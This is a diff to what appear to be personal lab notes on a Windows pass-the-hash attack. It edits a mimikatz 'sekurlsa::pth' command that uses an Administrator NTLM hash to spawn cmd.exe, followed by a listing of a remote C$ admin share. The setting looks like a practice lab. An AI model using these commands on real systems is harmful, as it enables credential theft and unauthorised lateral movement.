@@ -12,7 +12,7 @@
 - pass the hash
     - the `/run:cmd.exe` part seems unneeded 
 ```
-sekurlsa::pth /user:Administrator /domain:WIN10CLIENT /ntlm:af992895db0f2c42a1bc96546e92804a /run:cmd.exe
+sekurlsa::pth /user:Administrator /domain:win10adm /ntlm:af992895db0f2c42a1bc96546e92804a /run:cmd.exe
 ```
 - dir \\192.168.56.30\C$
 
